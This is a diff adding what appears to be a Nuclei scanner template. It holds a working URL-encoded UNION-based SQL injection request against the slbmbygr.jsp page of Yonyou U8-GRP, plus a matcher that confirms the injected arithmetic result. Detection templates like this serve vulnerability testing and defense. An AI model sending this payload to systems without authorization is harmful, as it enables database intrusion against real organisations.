@@ -1,0 +1,20 @@
+id: yonyou-u8-grp-slbmbygr-sqli
+ 
+info:
+  name: 用友U8-GRP slbmbygr sql注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /u8qx/slbmbygr.jsp?gsdm=1%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BISNULL%28CAST%28111123%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL--%20RTDH HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'12334653') && status_code == 200"
